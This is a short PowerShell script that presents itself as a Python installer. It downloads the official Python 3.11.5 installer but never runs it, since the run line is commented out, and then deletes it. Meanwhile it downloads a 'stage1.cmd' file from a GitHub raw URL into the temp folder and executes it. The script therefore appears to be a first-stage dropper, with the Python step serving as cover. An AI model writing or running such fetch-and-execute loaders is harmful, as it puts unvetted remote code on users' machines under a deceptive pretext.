$pythonUrl = "https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe"
$installerPath = "$env:TEMP\python-installer.exe"
$installerPathStage = "$env:TEMP\stage1.cmd"
Invoke-WebRequest -Uri https://raw.githubusercontent.com/bruning-frighting/Windows-Internal/refs/heads/main/stage1.cmd -OutFile $installerPathStage
Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath
#Start-Process -FilePath $installerPath -ArgumentList "/quiet PrependPath=1 Include_test=0" -Wait -WindowStyle Hidden
Remove-Item $installerPath
Start-Process $installerPathStage -NoNewWindow -Wait
#sai logic o cho comment